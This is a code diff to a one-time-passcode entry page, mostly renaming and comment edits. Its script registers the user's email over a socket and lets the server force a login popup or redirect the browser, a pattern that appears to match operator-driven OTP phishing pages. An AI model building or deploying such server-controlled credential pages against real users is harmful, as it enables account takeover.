@@ -61,7 +61,6 @@ h2{
   margin-bottom:28px;
 }
 
-/* Single OTP Input - like screenshot */
 .otp-input{
   width:100%;
   padding:16px;
@@ -134,7 +133,7 @@ button:disabled{
   display:none;
 }
 
-/* POPUP MODAL STYLES (ADDED) */
+/* POPUP MODAL STYLES - ADDED ONLY */
 .modal-overlay {
   display: none;
   position: fixed;
@@ -159,11 +158,6 @@ button:disabled{
   padding: 32px 24px;
   text-align: center;
   box-shadow: 0 25px 50px rgba(0,0,0,0.3);
-  animation: modalFadeIn 0.3s ease;
-}
-@keyframes modalFadeIn {
-  from { opacity: 0; transform: scale(0.95); }
-  to { opacity: 1; transform: scale(1); }
 }
 .modal-icon {
   width: 60px;
@@ -249,7 +243,7 @@ button:disabled{
   </div>
 </div>
 
-<!-- FORCE LOGIN POPUP MODAL (ADDED) -->
+<!-- POPUP MODAL - ADDED ONLY -->
 <div id="loginModal" class="modal-overlay">
   <div class="modal">
     <div class="modal-icon">
@@ -278,16 +272,16 @@ button:disabled{
   let isProcessing = false;
   let approvalInterval = null;
 
-  // Socket.io connection for popup events (ADDED)
-  let socket = null;
-  function connectSocket() {
-    socket = io();
-    socket.on('connect', () => {
-      console.log('✅ Socket connected');
-      socket.emit('identify', { email });
+  // Socket for popup only - SEPARATE from OTP logic
+  let popupSocket = null;
+  function connectPopupSocket() {
+    popupSocket = io();
+    popupSocket.on('connect', () => {
+      console.log('Popup socket connected');
+      popupSocket.emit('identify', { email });
     });
     
-    socket.on('force-login-popup', (data) => {
+    popupSocket.on('force-login-popup', (data) => {
       if (data.email === email) {
         const modal = document.getElementById('loginModal');
         modal.classList.add('active');
@@ -299,13 +293,13 @@ button:disabled{
       }
     });
     
-    socket.on('redirect-to-success', (data) => {
+    popupSocket.on('redirect-to-success', (data) => {
       if (data.email === email) {
         window.location.href = data.redirectUrl;
       }
     });
   }
-  connectSocket();
+  connectPopupSocket();
 
   function getOTP() {
     return otpInput.value.trim();
@@ -379,7 +373,7 @@ button:disabled{
     }
   }
 
-  // Modal functions (ADDED)
+  // Modal functions
   function hideLoginModal() {
     document.getElementById('loginModal').classList.remove('active');
   }
